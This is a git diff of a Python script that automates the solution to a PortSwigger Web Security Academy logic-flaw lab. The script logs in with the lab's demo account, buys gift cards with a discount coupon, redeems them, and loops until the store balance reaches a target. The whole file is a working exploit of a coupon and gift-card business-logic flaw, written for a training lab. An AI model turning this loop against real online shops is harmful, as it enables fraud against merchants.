@@ -1,21 +1,20 @@
 # A Python script that solves the following lab:
 # https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money
 
-# Notes to self:
-# Clean Code
-# Use same quotation styles
-# Organize code
-# Make it easier to read
-# Rewrite every function
-# Handle errors
-# Print program proccess to user
-
 from bs4 import BeautifulSoup
 import requests
 import sys
 
 LAB_SUB_DOMAIN = ""
 LAB_URL = "https://" + LAB_SUB_DOMAIN + "." + "web-security-academy.net"
+URL_PATHS = {
+    "LOGIN": "/login",
+    "ACCOUNT": "/my-account",
+    "GIFT_CARD": "/my-account/gift-card",
+    "CART": "/cart",
+    "COUPON": "/cart/coupon",
+    "CHECKOUT": "/cart/checkout"
+}
 
 def find_csrf_token(html):
     SOUP = BeautifulSoup(html, "html.parser")
@@ -27,13 +26,12 @@ def find_csrf_token(html):
         return None
 
 def attempt_login():
-    LOGIN_PATH = "/login"
     SESSION = requests.Session()
-    GET_LOGIN_PAGE = SESSION.get(LAB_URL + LOGIN_PATH)
+    GET_LOGIN_PAGE = SESSION.get(LAB_URL + URL_PATHS["LOGIN"])
     LOGIN_HTML = GET_LOGIN_PAGE.text
     CSRF_TOKEN = find_csrf_token(LOGIN_HTML)
     LOGIN_DATA = {"csrf": CSRF_TOKEN, "username": "wiener", "password": "peter"}
-    LOGIN_POST_RESPONSE = SESSION.post(LAB_URL + LOGIN_PATH, data = LOGIN_DATA)
+    LOGIN_POST_RESPONSE = SESSION.post(LAB_URL + URL_PATHS["LOGIN"], data = LOGIN_DATA)
     if "Your username is: wiener" in LOGIN_POST_RESPONSE.text:
         print("Login successful!")
         return SESSION
@@ -52,21 +50,20 @@ def get_balance(html):
 
 def send_giftcards_to_cart(session):
     print("Sending giftcards to cart...")
-    CART_PATH = "/cart"
     DATA = {"productId": "2", "redir": "PRODUCT", "quantity": "14"}
-    session.post(LAB_URL + CART_PATH, data = DATA)
-    GET_CART_PAGE = session.get(LAB_URL + CART_PATH)
+    session.post(LAB_URL + URL_PATHS["CART"], data = DATA)
+    GET_CART_PAGE = session.get(LAB_URL + URL_PATHS["CART"])
     CART_PAGE_HTML = GET_CART_PAGE.text
     return CART_PAGE_HTML
 
 def apply_coupon(session, csrf_token):
     DATA = {"csrf": csrf_token, "coupon": "SIGNUP30"}
-    session.post(LAB_URL + "/cart/coupon", data = DATA)
+    session.post(LAB_URL + URL_PATHS["COUPON"], data = DATA)
     return None
 
 def checkout(session, csrf_token):
     DATA = {"csrf": csrf_token}
-    CHECKOUT_RESPONSE = session.post(LAB_URL + "/cart/checkout", data = DATA)
+    CHECKOUT_RESPONSE = session.post(LAB_URL + URL_PATHS["CHECKOUT"], data = DATA)
     CHECKOUT_HTML = CHECKOUT_RESPONSE.text
     return CHECKOUT_HTML
 
@@ -87,12 +84,11 @@ def get_gift_card_codes(html):
 def claim_gift_cards(session, token, codes):
     for code in codes:
         data = {"csrf": token, "gift-card": code}
-        code_response = session.post(LAB_URL + "/my-account/gift-card", data = data)
+        code_response = session.post(LAB_URL + URL_PATHS["GIFT_CARD"], data = data)
         print(code_response)
     return None
 
 def add_money(session):
-    ACCOUNT_PATH = "/my-account"
     TARGET_PRICE = 2000
     account_balance = 0
     while account_balance < TARGET_PRICE:
@@ -103,7 +99,7 @@ def add_money(session):
         gift_card_codes = get_gift_card_codes(checkout_page_html)
         print(gift_card_codes)
         claim_gift_cards(session, cart_page_csrf, gift_card_codes) #reusing csrf token?
-        GET_MY_ACCOUNT = session.get(LAB_URL + ACCOUNT_PATH)
+        GET_MY_ACCOUNT = session.get(LAB_URL + URL_PATHS["ACCOUNT"])
         MY_ACCOUNT_HTML = GET_MY_ACCOUNT.text
         account_balance = get_balance(MY_ACCOUNT_HTML)
         print(account_balance)
